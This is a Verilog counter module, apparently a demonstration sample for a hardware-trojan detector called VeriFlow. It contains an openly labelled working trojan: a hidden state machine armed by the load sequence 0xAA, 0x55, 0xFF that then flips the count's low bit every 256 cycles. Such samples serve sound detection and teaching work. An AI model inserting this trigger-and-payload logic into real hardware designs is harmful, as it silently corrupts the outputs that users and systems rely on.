// =============================================================================
// VeriFlow - Counter with Hardware Trojan (DEMO ONLY)
// =============================================================================
// ⚠️  WARNING: Intentionally injected trojan for demonstration.
//
// TROJAN TYPE: Hidden state machine with kill switch
// TRIGGER: A specific load_value sequence activates a hidden FSM
// PAYLOAD: Silently corrupts the count output after activation
// =============================================================================

module counter_trojan #(
    parameter WIDTH = 8
)(
    input  wire                clk,
    input  wire                rst_n,
    input  wire                enable,
    input  wire                up_down,
    input  wire                load,
    input  wire [WIDTH-1:0]    load_value,
    output reg  [WIDTH-1:0]    count,
    output wire                max_reached,
    output wire                min_reached
);

    assign max_reached = (count == {WIDTH{1'b1}});
    assign min_reached = (count == {WIDTH{1'b0}});

    // ╔═══════════════════════════════════════════════════════════╗
    // ║  TROJAN: Hidden state machine (Kill switch)              ║
    // ║  Watches for a magic load sequence: 0xAA → 0x55 → 0xFF  ║
    // ║  Once armed, corrupts count on every 256th cycle         ║
    // ╚═══════════════════════════════════════════════════════════╝
    reg [2:0]  trojan_state;        // HT-002: Suspicious hidden FSM
    reg [7:0]  corruption_timer;     // HT-004: Time-bomb pattern
    reg        armed;

    localparam T_IDLE  = 3'd0;
    localparam T_SEQ1  = 3'd1;
    localparam T_SEQ2  = 3'd2;
    localparam T_ARMED = 3'd3;
    localparam T_DEAD  = 3'd4;   // Unreachable in normal operation

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trojan_state    <= T_IDLE;
            corruption_timer <= 8'd0;
            armed           <= 1'b0;
        end else begin
            case (trojan_state)
                T_IDLE:  if (load && load_value == 8'hAA) trojan_state <= T_SEQ1;
                T_SEQ1:  if (load && load_value == 8'h55) trojan_state <= T_SEQ2;
                         else if (load) trojan_state <= T_IDLE;
                T_SEQ2:  if (load && load_value == 8'hFF) begin
                             trojan_state <= T_ARMED;
                             armed <= 1'b1;
                         end else if (load) trojan_state <= T_IDLE;
                T_ARMED: corruption_timer <= corruption_timer + 1;
                T_DEAD:  trojan_state <= T_DEAD;  // Dead/unreachable state
                default: trojan_state <= T_IDLE;
            endcase
        end
    end

    // === Main counter logic ===
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            count <= {WIDTH{1'b0}};
        end else if (load) begin
            count <= load_value;
        end else if (enable) begin
            if (up_down)
                count <= count + 1'b1;
            else
                count <= count - 1'b1;

            // ╔═══════════════════════════════════╗
            // ║  TROJAN PAYLOAD                   ║
            // ║  Silently XORs a bit every 256    ║
            // ║  cycles after activation           ║
            // ╚═══════════════════════════════════╝
            if (armed && corruption_timer == 8'hFF) begin
                count[0] <= ~count[0];    // HT-003: Unauthorized output modification
            end
        end
    end

endmodule
